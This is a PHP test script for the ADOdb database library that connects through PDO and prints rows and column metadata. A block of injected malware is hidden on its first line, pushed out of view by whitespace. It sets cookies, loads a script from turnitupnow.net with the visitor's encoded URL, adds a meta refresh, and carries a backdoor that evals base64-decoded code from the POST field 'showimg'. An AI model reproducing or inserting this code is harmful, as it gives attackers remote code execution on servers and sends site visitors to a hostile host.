<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

error_reporting(E_ALL);
include('../adodb.inc.php');

echo "<pre>";
try {
	echo "New Connection\n";
	
	
	$dsn = 'pdo_mysql://root:@localhost/northwind?persist';
	
	if (!empty($dsn)) {
		$DB =& NewADOConnection($dsn) || die("CONNECT FAILED");
		$connstr = $dsn;
	} else {
	
		$DB = NewADOConnection('pdo');
		
		echo "Connect\n";
		
		$u = ''; $p = '';
		/*
		$connstr = 'odbc:nwind';
		
		$connstr = 'oci:';
		$u = 'scott';
		$p = 'natsoft';
		
		
		$connstr ="sqlite:d:\inetpub\adodb\sqlite.db";
		*/
		
		$connstr = "mysql:dbname=northwind";
		$u = 'root';
		
		$connstr = "pgsql:dbname=test";
		$u = 'tester';
		$p = 'test';
		
		$DB->Connect($connstr,$u,$p) || die("CONNECT FAILED");
	
	}
	
	echo "connection string=$connstr\n Execute\n";
	
	//$ADODB_FETCH_MODE = ADODB_FETCH_ASSOC;
	$rs = $DB->Execute("select * from ADOXYZ where id<3");
	if  ($DB->ErrorNo()) echo "*** errno=".$DB->ErrorNo() . " ".($DB->ErrorMsg())."\n";
	
	
	//print_r(get_class_methods($DB->_stmt));
	
	if (!$rs) die("NO RS");
	
	echo "Meta\n";
	for ($i=0; $i < $rs->NumCols(); $i++) {
		var_dump($rs->FetchField($i));
		echo "<br>";
	}
	
	echo "FETCH\n";
	$cnt = 0;
	while (!$rs->EOF) {
		adodb_pr($rs->fields); 
		$rs->MoveNext();
		if ($cnt++ > 1000) break;
	}
	
	echo "<br>--------------------------------------------------------<br>\n\n\n";
	
	$stmt = $DB->PrepareStmt("select * from ADOXYZ");
	
	$rs = $stmt->Execute();
	$cols = $stmt->NumCols(); // execute required
	
	echo "COLS = $cols";
	for($i=1;$i<=$cols;$i++) {
		$v = $stmt->_stmt->getColumnMeta($i);
		var_dump($v);
	}
	
	echo "e=".$stmt->ErrorNo() . " ".($stmt->ErrorMsg())."\n";
	while ($arr = $rs->FetchRow()) {
		adodb_pr($arr);
	}
	die("DONE\n");

} catch (exception $e) {
	echo "<pre>";
	echo $e;
	echo "</pre>";
}

?>